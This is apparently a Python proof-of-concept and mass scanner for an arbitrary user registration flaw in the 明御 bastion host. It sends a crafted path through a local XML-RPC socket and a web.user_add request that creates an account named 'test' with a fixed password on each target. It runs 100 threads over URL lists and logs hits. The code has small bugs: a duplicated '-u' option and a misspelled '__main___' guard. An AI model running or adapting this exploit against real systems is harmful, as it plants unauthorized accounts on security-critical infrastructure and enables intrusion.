import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test="""
    
                ███╗   ███╗██╗███╗   ██╗ ██████╗██╗   ██╗██╗   ██╗
                ████╗ ████║██║████╗  ██║██╔════╝╚██╗ ██╔╝██║   ██║
                ██╔████╔██║██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║
                ██║╚██╔╝██║██║██║╚██╗██║██║   ██║ ╚██╔╝  ╚██╗ ██╔╝
                ██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝  ██║    ╚████╔╝ 
                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝     ╚═══╝  
                                                                author:秋妤
                                                                date:2024.09.26
                                                                version:1.0 
"""
    print(test)

def poc(target):
    payload = '/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc'
    headers = {
        'Cookie':'LANG=zh;USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848',
        'Cache-Control':'max-age=0',
        'Sec-Ch-Ua':'"NotA;Brand";v="99","Chromium";v="100","GoogleChrome";v="100"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/100.0.4896.127Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
        'Content-Length':'1121',

    }
    data = '<?xml version="1.0"?>\n<methodCall>\n<methodName>web.user_add</methodName>\n<params>\n<param>\n<value>\n<array>\n<data>\n<value>\n<string>admin</string>\n</value>\n<value>\n<string>5</string>\n</value>\n<value>\n<string>10.0.0.1</string>\n</value>\n</data>\n</array>\n</value>\n</param>\n<param>\n<value>\n<struct>\n<member>\n<name>uname</name>\n<value>\n<string>test</string>\n</value>\n</member>\n<member>\n<name>name</name>\n<value>\n<string>test</string>\n</value>\n</member>\n<member>\n<name>pwd</name>\n<value>\n<string>1qaz@3edC12345</string>\n</value>\n</member>\n<member>\n<name>authmode</name>\n<value>\n<string>1</string>\n</value>\n</member>\n<member>\n<name>deptid</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>email</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>mobile</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>comment</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>roleid</name>\n<value>\n<string>102</string>\n</value>\n</member>\n</struct></value>\n</param>\n</params>\n</methodCall>'
    try:
        res = requests.post(url=target + payload,headers=headers,data=data,verify=False)
        if res.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('明御_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')

    except:
        print(f'[-]该url:{target}该站点存在问题')

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 明御运维审计与风险控制系统堡垒机任意用户注册 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__=="__main___":
    main()
